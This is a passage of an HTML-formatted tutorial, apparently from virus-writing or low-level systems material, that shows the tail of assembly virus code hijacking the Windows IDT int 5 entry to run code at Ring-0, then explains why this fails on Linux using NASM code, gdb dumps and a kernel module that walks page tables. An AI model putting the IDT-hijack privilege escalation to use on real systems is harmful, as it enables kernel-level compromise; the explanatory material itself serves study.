+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">5h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Generate the exception</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span>idtaddr<span style="color: #339933;">+</span><span style="color: #ff0000;">2h</span><span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; Resotre entry offset of the IDT</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">,</span>8d<span style="color: #339933;">*</span><span style="color: #ff0000;">5h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">6</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebx</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #339933;">-</span><span style="color: #ff0000;">1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;ExitProcess<br/>
+<br/>
+ring0code<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushad</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Code executed under Ring-0</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popad</span><br/>
+<br/>
+exit_r0<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">iretd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+endvirii<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+end<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end &nbsp; &nbsp; startvirii<br/>
+<br/>
+<span style="color: black; font-style: italic;">;****************************************************************************</span><br/>
+&nbsp;</div>
+<p>What makes possible that this code works in Windows? The answer is simple, firstly Windows can directionate with user selectors the kernel memory, also (and besidess it seems incredible) lacks of protection by pagination in addresses superior to 0xC0000000, that lies, as linux, the code executed in Ring-0.</p>
+<p>So if we can directionate the IDT memory, and also we can write there, the jump to Ring-0 is easy. In this example we have chosen the int 0x05 because it is already a TRAP GATE in Windows,that's why we only modify the IDT entry and instead jump to the memory address assigned by windows, it would jump to our label ring0code inside the perprocess memory of our process.</p>
+<p>However, in Linux we can't directionate the user memory with Ring-0 selectors so we couldn't do the jump in case that we could directionate the kernel memory and the pagination protection would be deactivated, the modification of the IDT wouldn't be enough. If we modify the int 0x5 entry of the IDT for generate a TRAP GATE, we wouldn't be able to use the Ring-0 selector of Linux (0x10). In the IDT we would find the address 0x10:ring0code for make the jump, but that address doesn't point to the PerProcess memory; in fact the base address of the 0x10 segment is 0xC0000000, really we would be jumping to the address 0xC0000000+ring0code.</p>
+<p>Let's see where lies the IDT in Linux. Compile the next code with NASM:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">extern</span> puts<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">global</span> main<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">SECTION</span> <span style="color: #0000ff; font-weight: bold;">.text</span><span style="color: black;">&#93;</span><br/>
+<br/>
+main<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">sidt</span> &nbsp; &nbsp;<span style="color: black;">&#91;</span>datos<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Put in datos var the IDT address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">nop</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sgdt</span> &nbsp; &nbsp;<span style="color: black;">&#91;</span>datos<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Put in datos var the GDT address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">nop</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sldt</span> &nbsp; &nbsp;<span style="color: black;">&#91;</span>datos<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Put in datos var the LDT address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">nop</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">SECTION</span> <span style="color: #0000ff; font-weight: bold;">.data</span><span style="color: black;">&#93;</span><br/>
+<br/>
+data_ &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span> &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0x0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0x0</span><br/>
+&nbsp;</div>
+<p>Executing this step by step, and reading the value stores in 'data_', we get the following memory dumps. (0x80495ED = address of 'data_' variable):</p>
+<pre>
+        Dump after SIDT
+
+        (gdb)x/2 0x80495ED
+        0x80495ed &lt;data_>: 0x501007FF       0x0807C180         
+      
+        Dump after SGDT  
+
+        (gdb)x/2 0x80495ED
+        0x80495ed &lt;data_>: 0x6880203F       0x0807C010  
+
+        Dump after SLDT
+
+        (gdb)x/2 0x80495ED
+        0x80495ed &lt;data_>: 0x688002Af       0x0807C010
+</pre>
+<p>The first and the second assembler opcodes return in the first 16 bits of 'data_' the IDT and the GDT limits respectively, and in the next 32 bits the lineal address of that structures. Meanwhile, the SLDT only returns a selector that points to its descriptor inside the GDT (each LDT must have defined a descriptor in the GDT).</p>
+<p>So we know that the IDT has as base address 0xC1805010 and its limit is 0x7FF bytes. The GDT will have as base address 0xC0106880 and will have a size of 0x203F bytes. And of the LDT we know that its descriptor is 0x2AF. As we were expecting, the addresses are all above 0xC0000000, so they are well protected from the user-processes.</p>
+<p>Another way for access the kernel memory could be to map kernel pages below 0xC0000000, but painfully, that is not possible because the page table is mapped above the 0xC0000000 address, so it can't be modified by Ring-3 processes. Linux maps all the physical memory of your machine parting from the linear address 0xC0000000, or, with another words, the virtual address 0x0 using the kernel segment 0x10. We can build a module for read the CR3 reg, that contains the physical address of the page table, and with that info, visualize the mapped pages. The program would be the following one:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/****************************************************************************<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Lector de la Tabla de Paginas &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp;***************************************************************************/</span><br/>
+<br/>
+<span style="color: #808080; font-style: italic;">/*<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Format of an entry<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp;31-12 &nbsp; &nbsp; &nbsp; &nbsp; 11-9 &nbsp; 7 &nbsp; &nbsp;6 &nbsp; &nbsp;5 &nbsp; &nbsp; 2 &nbsp; &nbsp; &nbsp;1 &nbsp; &nbsp;0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;address &nbsp; &nbsp; &nbsp; &nbsp;OS &nbsp; &nbsp;4M &nbsp; D &nbsp; &nbsp;A &nbsp; &nbsp;U/S &nbsp; &nbsp;R/W &nbsp; P<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If p=1 the page is in memory <br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If R/W=0 means that it's readonly<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If U/S=1 means that the page is an user page &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If A=1 means that the page have been accessed<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If D=1 page dirty<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;If 4M=1 it's a 4M page (only for the tdd entry)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;OS is specific of the operative system<br/>
+<br/>
+*/</span><br/>
+<br/>
+<br/>
+<span style="color: #339933;">#include &lt;linux/module.h&gt; </span><br/>
+<span style="color: #339933;">#include &lt;linux/kernel.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;linux/errno.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;linux/mm.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;asm/system.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;linux/sched.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;unistd.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;asm/page.h&gt;</span><br/>
+<span style="color: #339933;">#include &lt;asm/pgtable.h&gt;</span><br/>
+<span style="color: #339933;">#ifdef MODULE</span><br/>
+<br/>
+<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>sys_call_table<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span>tpaginas<span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> r_cr0<span style="color: #339933;">;</span><br/>
+<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> r_cr4<span style="color: #339933;">;</span> &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* read some interesting registers */</span><br/>
+<br/>
+<span style="color: #993333;">int</span> init_module<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span> &nbsp;<br/>
+&nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> <span style="color: #339933;">*</span>temp<span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: #993333;">int</span> x<span style="color: #339933;">,</span>y<span style="color: #339933;">,</span>z<span style="color: #339933;">;</span><br/>
+&nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* Read the physical address of the page table that<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; is matches with the virtual address */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* And btw, i read some interesting processor regs<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; like cr0 and cr4 */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* As we can see, in CR4 is activated the option of<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 4M pages */</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* And in CR0 the WP bit active :) */</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; __asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<br/>
+&nbsp; &nbsp; movl %cr3,%eax<br/>
+&nbsp; &nbsp; movl %eax,(tpaginas) <br/>
+&nbsp; &nbsp; movl %cr0,%eax<br/>
+&nbsp; &nbsp; movl %eax,(r_cr0)<br/>
+&nbsp; &nbsp; movl %cr4,%eax<br/>
+&nbsp; &nbsp; movl %eax,(r_cr4)<br/>
+&nbsp; &nbsp;&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp;<br/>
+&nbsp; x<span style="color: #339933;">=</span>tpaginas<span style="color: #339933;">+</span><span style="color: #208080;">0xc0000000</span><span style="color: #339933;">;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; The physical and virtual address <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; of the page table is : %x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>tpaginas<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; Control Register Cr0: %x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>r_cr0<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; Control Register Cr4: %x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span>r_cr4<span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <br/>
+&nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>z<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>z<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">90000000</span><span style="color: #339933;">;</span>z<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span> <br/>
+&nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>x<span style="color: #339933;">=</span><span style="color: #208080;">0x0</span><span style="color: #339933;">;</span>x<span style="color: #339933;">&lt;</span><span style="color: #208080;">0x3ff</span><span style="color: #339933;">;</span>x<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x01</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <br/>
+&nbsp;<span style="color: black;">&#123;</span><br/>
+&nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Entry %x &nbsp;-&gt; %x &quot;</span><span style="color: #339933;">,</span>x<span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xfffff000</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; <br/>
+&nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; &nbsp; &nbsp;u/s:%d &nbsp; &nbsp; &nbsp;r/w:%d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x04</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x02</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; &nbsp; &nbsp;OS:%x &nbsp;&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span><span style="color: #208080;">0xffff</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">9</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; p:%d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x01</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x80</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">7</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;In the virtual address -&gt; &nbsp;%x&quot;</span><span style="color: #339933;">,</span>x<span style="color: #339933;">&lt;&lt;</span><span style="color: #0000dd;">22</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; there is a 4M page <span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>z<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>z<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">90000000</span><span style="color: #339933;">;</span>z<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;tpaginas<span style="color: #339933;">++;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>z<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>z<span style="color: #339933;">&lt;</span><span style="color: #0000dd;">4000000</span><span style="color: #339933;">;</span>z<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; temp<span style="color: #339933;">=</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xfffff000</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* in temp i read the page<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; table address */</span><br/>
+&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>temp<span style="color: #339933;">!=</span><span style="color: #0000dd;">0</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>tpaginas <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>y<span style="color: #339933;">&lt;</span><span style="color: #208080;">0x3ff</span><span style="color: #339933;">;</span>y<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">&#123;</span> &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; <span style="color: #b1b100;">if</span> &nbsp;<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x01</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <br/>
+&nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Virtual &nbsp;%x -&gt; %x &quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span>x<span style="color: #339933;">&lt;&lt;</span><span style="color: #0000dd;">22</span><span style="color: #339933;">|</span>y<span style="color: #339933;">&lt;&lt;</span><span style="color: #0000dd;">12</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xfffff000</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> &nbsp; <br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; &nbsp; &nbsp;u/s:%d &nbsp; &nbsp; &nbsp;r/w:%d&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x04</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x02</span><span style="color: black;">&#41;</span><span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; &nbsp; &nbsp;OS:%x &nbsp;&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span><span style="color: #208080;">0xffff</span> <span style="color: black;">&#41;</span> <span style="color: #339933;">&gt;&gt;</span><span style="color: #0000dd;">9</span> <span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; printk<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot; &nbsp; p:%d<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span><span style="color: black;">&#41;</span> <span style="color: #339933;">*</span>temp <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0x01</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; <span style="color: black;">&#125;</span><span style="color: #339933;">;</span><br/>
